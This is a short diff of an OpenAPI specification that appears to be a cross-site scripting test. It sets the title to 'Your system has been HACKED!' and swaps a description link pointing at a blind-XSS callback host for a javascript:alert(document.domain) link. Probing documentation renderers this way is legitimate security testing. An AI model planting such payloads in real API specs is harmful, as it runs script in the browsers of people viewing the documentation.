@@ -1,7 +1,7 @@
 openapi: 3.0.0
 info:
   title: Your system has been HACKED!
-  description: Optional multiline or single-line description in [CommonMark](https://paktiko.bxss.in#) or HTML.
+  description: Optional multiline or single-line description in [CommonMark](javascript:alert(document.domain)) or HTML.
   version: 0.1.9
 
 servers:
